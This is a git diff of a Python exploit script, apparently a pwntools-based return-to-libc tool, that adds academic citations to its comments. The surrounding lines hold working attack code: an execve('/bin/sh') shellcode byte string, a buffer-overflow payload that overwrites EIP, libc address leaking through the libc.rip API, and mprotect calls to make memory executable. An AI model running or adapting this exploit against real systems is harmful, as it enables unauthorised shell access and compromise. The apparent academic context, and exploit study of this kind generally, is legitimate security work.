@@ -22,6 +22,7 @@ static = "./itc_app"
 
 headers1 = {'Content-Type': 'application/json'}
 headers2 = headers1
+# (Baumstark, 2020)
 findLibcUrl = 'https://libc.rip/api/find'
 libcSearchUrl = "https://libc.rip/api/libc/"
 redirectStdErr = True
@@ -162,7 +163,7 @@ def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff, percpOff):
     libc_address = putsAddr - putsOffset
     log.success(f'LIBC base: {hex(libc_address)}')
 
-    # 21 bytes execve('/bin/sh') shellcode from https://shell-storm.org/shellcode/files/shellcode-841.html
+    # 21 bytes execve('/bin/sh') shellcode from https://shell-storm.org/shellcode/files/shellcode-841.html (Bem, 2013)
     shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
     
     # If the user selects to write the shellcode to the stack then leak stack locations via creating a format string vulnerability
@@ -240,7 +241,7 @@ def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff, percpOff):
     
     # Execute mprotect(&codeaddr, 0x21000, PROT_READ (0x1) | PROT_WRITE (0x2) | PROT_EXEC (0x4)) 
     # This allows the program to write to and execute the address found above
-    #https://man7.org/linux/man-pages/man2/mprotect.2.html
+    #https://man7.org/linux/man-pages/man2/mprotect.2.html (Free Software Foundation, 2018)
     payload = flat(
         b'C' * buffSize,                # Padding so the next bytes will overwrite the EIP
         p32(mprotectOff+libc_address),  # Overflowed function will execute mprotect() on return
@@ -347,7 +348,7 @@ def getPercXOff(libcJson):
     # Find and return the offset in the binary of '%x'
     return filebytes.find(b"%x\x00")
 
-# String to boolean converter is a modified version of: https://stackoverflow.com/a/43357954
+# String to boolean converter is a modified version of: https://stackoverflow.com/a/43357954 (Maxim & dennlinger, 2021)
 def str2bool(v, argname):
     if isinstance(v, bool):
         return v
